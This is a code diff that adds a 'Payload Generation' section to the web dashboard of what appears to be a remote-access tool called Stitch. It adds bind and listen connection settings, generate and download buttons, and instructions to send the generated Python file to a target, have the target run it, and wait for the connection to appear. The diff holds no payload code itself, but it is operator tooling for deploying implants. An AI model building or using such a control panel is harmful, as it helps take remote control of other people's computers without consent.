@@ -26,6 +26,9 @@
                 <li><a href="#" class="nav-link" data-section="files">
                     <span>📁</span> Files
                 </a></li>
+                <li><a href="#" class="nav-link" data-section="payloads">
+                    <span>🚀</span> Payloads
+                </a></li>
                 <li><a href="#" class="nav-link" data-section="logs">
                     <span>📋</span> Debug Logs
                 </a></li>
@@ -329,6 +332,87 @@
                 
                 <!-- Pagination Controls -->
                 <div id="filesPaginationControls"></div>
+            </section>
+            
+            <!-- Payloads Section -->
+            <section id="payloads-section" class="content-section">
+                <div class="section-header">
+                    <h1>🚀 Payload Generation</h1>
+                    <p>Generate custom Stitch payloads for target deployment</p>
+                </div>
+                
+                <div class="payload-generator">
+                    <div class="generator-form">
+                        <h3>Payload Configuration</h3>
+                        <form id="payloadForm">
+                            <div class="form-row">
+                                <div class="form-group">
+                                    <label>
+                                        <input type="checkbox" id="enableBind" checked>
+                                        Enable Bind Mode (Target connects to you)
+                                    </label>
+                                    <div class="bind-config" id="bindConfig">
+                                        <input type="text" id="bindHost" placeholder="Your IP (leave empty for any)" value="">
+                                        <input type="number" id="bindPort" placeholder="Port" value="4433" min="1" max="65535">
+                                    </div>
+                                </div>
+                                
+                                <div class="form-group">
+                                    <label>
+                                        <input type="checkbox" id="enableListen" checked>
+                                        Enable Listen Mode (You connect to target)
+                                    </label>
+                                    <div class="listen-config" id="listenConfig">
+                                        <input type="text" id="listenHost" placeholder="Target IP" value="localhost">
+                                        <input type="number" id="listenPort" placeholder="Port" value="4455" min="1" max="65535">
+                                    </div>
+                                </div>
+                            </div>
+                            
+                            <div class="form-actions">
+                                <button type="button" class="cmd-btn" onclick="generatePayload()">
+                                    🚀 Generate Payload
+                                </button>
+                                <button type="button" class="clear-btn" onclick="resetPayloadForm()">
+                                    Reset
+                                </button>
+                            </div>
+                        </form>
+                    </div>
+                    
+                    <div class="payload-output" id="payloadOutput" style="display: none;">
+                        <h3>Generated Payload</h3>
+                        <div class="payload-info" id="payloadInfo"></div>
+                        <div class="payload-actions">
+                            <button class="cmd-btn" onclick="downloadPayload()">
+                                📥 Download Payload
+                            </button>
+                            <button class="clear-btn" onclick="copyPayloadInfo()">
+                                📋 Copy Info
+                            </button>
+                        </div>
+                    </div>
+                    
+                    <div class="payload-instructions">
+                        <h3>📖 Usage Instructions</h3>
+                        <div class="instructions-content">
+                            <h4>Bind Mode (Recommended)</h4>
+                            <p>• Target connects back to your server</p>
+                            <p>• Leave "Your IP" empty to accept connections from any IP</p>
+                            <p>• Make sure port 4433 is open on your firewall</p>
+                            
+                            <h4>Listen Mode</h4>
+                            <p>• You connect to the target</p>
+                            <p>• Useful when target is behind NAT/firewall</p>
+                            <p>• Target must be listening on specified port</p>
+                            
+                            <h4>Deployment</h4>
+                            <p>• Send the generated Python file to target</p>
+                            <p>• Target runs: <code>python stitch_payload.py</code></p>
+                            <p>• Connection will appear in the Connections tab</p>
+                        </div>
+                    </div>
+                </div>
             </section>
             
             <!-- Logs Section -->
